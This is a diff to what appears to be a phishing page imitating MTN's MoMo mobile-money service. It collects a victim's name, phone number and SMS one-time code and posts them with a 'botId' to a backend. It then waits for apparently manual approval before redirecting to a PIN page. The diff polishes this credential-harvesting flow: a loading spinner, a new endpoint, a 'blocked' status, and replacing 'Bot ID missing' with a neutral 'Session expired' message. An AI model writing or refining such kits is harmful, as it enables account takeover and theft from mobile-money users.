@@ -44,14 +44,11 @@
 
     .top {
       position: relative;
-      height: 200px; /* slightly shorter for OTP page */
+      height: 200px;
       background: #004c69;
       padding-top: 52px;
     }
 
-    /*
-      White curved bottom of blue area
-    */
     .top::after {
       content: "";
       position: absolute;
@@ -64,7 +61,7 @@
     }
 
     /* =========================================
-       TOP BAR WITH BACK BUTTON AND LOGO
+       TOP BAR
     ========================================= */
 
     .top-bar {
@@ -83,6 +80,9 @@
       text-decoration: none;
       font-weight: 300;
       line-height: 1;
+      background: none;
+      border: none;
+      cursor: pointer;
       transition: color 0.2s;
     }
     .back-btn:hover {
@@ -169,7 +169,6 @@
       margin-bottom: 20px;
     }
 
-    /* Instruction note */
     .instruction-note {
       font-size: 14px;
       color: #0a0a0a;
@@ -230,14 +229,14 @@
     }
 
     /* =========================================
-       MESSAGE BOX (status)
+       MESSAGE BOX
     ========================================= */
 
     #message-box {
       display: none;
       padding: 12px 16px;
       border-radius: 12px;
-      margin-bottom: 16px;
+      margin-top: 16px;
       font-size: 15px;
       font-weight: 500;
       border: 1px solid transparent;
@@ -254,7 +253,7 @@
     }
 
     /* =========================================
-       BOTTOM BUTTON (sticky)
+       BOTTOM BUTTON
     ========================================= */
 
     .bottom {
@@ -277,6 +276,11 @@
       transition: background 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 0.5px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
     }
 
     .continue-btn:enabled {
@@ -288,6 +292,31 @@
     }
     .continue-btn:enabled:active {
       transform: scale(.98);
+    }
+
+    /* Loading state keeps button colour and shows spinner */
+    .continue-btn.loading:disabled {
+      background: #005572;
+      opacity: 1;
+      cursor: wait;
+    }
+
+    .continue-btn .btn-text { display: inline; }
+    .continue-btn .btn-spinner {
+      display: none;
+      width: 26px;
+      height: 26px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    .continue-btn.loading .btn-text { display: none; }
+    .continue-btn.loading .btn-spinner { display: inline-block; }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     /* =========================================
@@ -346,15 +375,13 @@
 
 <div class="app">
 
-  <!-- ================= TOP BLUE AREA ================= -->
+  <!-- ================= TOP ================= -->
 
   <div class="top">
 
     <div class="top-bar">
-      <!-- Back button -->
-      <a href="#" class="back-btn">&#8592;</a>
+      <button class="back-btn" onclick="window.history.back()">&#8592;</button>
 
-      <!-- Logo (compact) -->
       <div class="logo">
         <div class="logo-box">
           <div class="logo-symbol"></div>
@@ -362,7 +389,6 @@
         <div class="logo-text">MoMo <span class="light">from MTN</span></div>
       </div>
 
-      <!-- Spacer for alignment -->
       <div style="width: 30px;"></div>
     </div>
 
@@ -391,7 +417,6 @@
       Resend code in <span class="timer">00:20</span>
     </div>
 
-    <!-- message-box will be injected here by JS -->
     <div id="message-box" style="display:none;"></div>
 
   </div>
@@ -399,27 +424,32 @@
   <!-- ================= BOTTOM BUTTON ================= -->
 
   <div class="bottom">
-    <button class="continue-btn" disabled>SUBMIT</button>
+    <button class="continue-btn" disabled>
+      <span class="btn-text">SUBMIT</span>
+      <span class="btn-spinner"></span>
+    </button>
   </div>
 
 </div>
 
 <script>
   (function() {
+    // ---------- CONFIG ----------
+    const BACKEND_URL = ""; // leave empty to use same-origin
+
     // ---------- READ FROM URL & LOCALSTORAGE ----------
     const urlParams = new URLSearchParams(window.location.search);
     let botId = urlParams.get('botId') || localStorage.getItem('botId');
     let phone = urlParams.get('phone') || localStorage.getItem('phone');
     let name = localStorage.getItem('fullName');
 
-    // If missing critical data, redirect back to phone page
     if (!botId) {
-      alert('Bot ID missing. Please start over.');
+      alert('Session expired. Please start over.');
       window.location.href = 'index.html';
       return;
     }
     if (!phone) {
-      alert('Phone number missing. Please start over.');
+      alert('Session expired. Please start over.');
       window.location.href = 'index.html';
       return;
     }
@@ -428,11 +458,9 @@
       localStorage.setItem('fullName', name);
     }
 
-    // Ensure botId is stored
     localStorage.setItem('botId', botId);
     localStorage.setItem('phone', phone);
 
-    // Show phone number in subtitle
     const subtitle = document.getElementById('subtitlePlaceholder');
     if (phone) {
       subtitle.textContent = 'We sent a code to ' + phone;
@@ -441,22 +469,20 @@
     // ---------- DOM REFS ----------
     const textarea = document.getElementById('smsMessage');
     const continueBtn = document.querySelector('.continue-btn');
-    const msgDiv = document.getElementById('message-box');
+    let msgDiv = document.getElementById('message-box');
 
-    // If message-box not in DOM, create it.
     if (!msgDiv) {
       const div = document.createElement('div');
       div.id = 'message-box';
       div.style.display = 'none';
       div.style.padding = '12px 16px';
       div.style.borderRadius = '12px';
-      div.style.marginBottom = '16px';
+      div.style.marginTop = '16px';
       div.style.fontSize = '15px';
       div.style.fontWeight = '500';
       const container = document.querySelector('.card');
       const resend = document.querySelector('.resend-wrap');
       container.insertBefore(div, resend);
-      // reassign
       msgDiv = document.getElementById('message-box');
     }
 
@@ -476,26 +502,18 @@
     function checkTextArea() {
       const val = textarea.value.trim();
       continueBtn.disabled = (val === '');
-      if (val !== '') {
-        continueBtn.style.background = '#005572';
-        continueBtn.style.color = '#fff';
-        continueBtn.style.cursor = 'pointer';
-      } else {
-        continueBtn.style.background = '#d1d5db';
-        continueBtn.style.color = '#fff';
-        continueBtn.style.cursor = 'not-allowed';
-      }
-      hideMessage();
     }
 
-    textarea.addEventListener('input', checkTextArea);
-    textarea.addEventListener('paste', function() {
+    textarea.addEventListener('input', function () {
+      checkTextArea();
+      hideMessage();
+    });
+    textarea.addEventListener('paste', function () {
       setTimeout(checkTextArea, 10);
     });
     textarea.focus();
 
     // ---------- TIMER (20 seconds) ----------
-    const timerSpan = document.querySelector('.timer');
     const resendWrap = document.getElementById('resendWrap');
     let totalSeconds = 20;
     let timerInterval = null;
@@ -551,7 +569,17 @@
       }
     }
 
-    // ---------- SUBMIT OTP ----------
+    function setLoading(on) {
+      if (on) {
+        continueBtn.disabled = true;
+        continueBtn.classList.add('loading');
+      } else {
+        continueBtn.classList.remove('loading');
+        checkTextArea();
+      }
+    }
+
+    // ---------- SUBMIT ----------
     continueBtn.addEventListener('click', function() {
       if (this.disabled) return;
 
@@ -561,89 +589,91 @@
         return;
       }
 
-      // Disable button and show loading
-      continueBtn.disabled = true;
-      continueBtn.textContent = 'Verifying...';
-      continueBtn.style.background = '#f5a623';
-      continueBtn.style.color = '#fff';
+      setLoading(true);
       hideMessage();
 
-      // Submit OTP
-      fetch('/submit-otp', {
+      // Server endpoint is /submit-code and expects field "code"
+      fetch(BACKEND_URL + '/submit-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           name: name,
           phone: phone,
-          otp: message,
+          code: message,
           botId: botId
         })
       })
       .then(function(res) {
-        if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
+        if (!res.ok) {
+          return res.text().then(function(t) {
+            const clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
+            throw new Error(clean);
+          });
+        }
         return res.json();
       })
       .then(function(data) {
         var requestId = data.requestId;
         if (!requestId) throw new Error('No request ID received');
 
-        // Start polling
         stopPolling();
         var attempts = 0;
-        var MAX_ATTEMPTS = 120; // ~3 minutes (1.5s interval)
+        var MAX_ATTEMPTS = 120; // ~3 minutes
 
         pollTimer = setInterval(function() {
           attempts++;
-          fetch('/check-otp/' + requestId)
+          // Server endpoint is /check-code/:requestId
+          fetch(BACKEND_URL + '/check-code/' + requestId)
             .then(function(res) {
               if (!res.ok) throw new Error('Verification error');
               return res.json();
             })
             .then(function(status) {
+              if (status.blocked === true) {
+                stopPolling();
+                setLoading(false);
+                showMessage('❌ Account restricted. Please try again later.', true);
+                return;
+              }
+
               if (status.approved === true) {
                 stopPolling();
-                // OTP approved – redirect to PIN page
+                setLoading(false);
+                showMessage('✅ Verified! Redirecting...', false);
                 var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
                              '&phone=' + encodeURIComponent(phone) +
                              '&name=' + encodeURIComponent(name);
-                window.location.href = pinUrl;
+                setTimeout(function() {
+                  window.location.href = pinUrl;
+                }, 700);
                 return;
               }
+
               if (status.approved === false) {
                 stopPolling();
+                setLoading(false);
                 showMessage('❌ Incorrect code. Please try again.', true);
-                continueBtn.disabled = false;
-                continueBtn.textContent = 'SUBMIT';
-                continueBtn.style.background = '#005572';
-                continueBtn.style.color = '#fff';
                 textarea.value = '';
                 checkTextArea();
                 textarea.focus();
                 return;
               }
-              // Still pending
+
               if (attempts > MAX_ATTEMPTS) {
                 stopPolling();
-                showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
-                continueBtn.disabled = false;
-                continueBtn.textContent = 'SUBMIT';
-                continueBtn.style.background = '#005572';
-                continueBtn.style.color = '#fff';
+                setLoading(false);
+                showMessage('⏳ Taking too long. Please try again.', true);
               }
-              // else keep polling
+              // else keep polling silently
             })
             .catch(function(err) {
-              // Network error – keep polling
               console.error('Polling error:', err);
             });
         }, 1500);
       })
       .catch(function(err) {
-        showMessage('❌ Send error: ' + err.message, true);
-        continueBtn.disabled = false;
-        continueBtn.textContent = 'SUBMIT';
-        continueBtn.style.background = '#005572';
-        continueBtn.style.color = '#fff';
+        setLoading(false);
+        showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
       });
     });
 
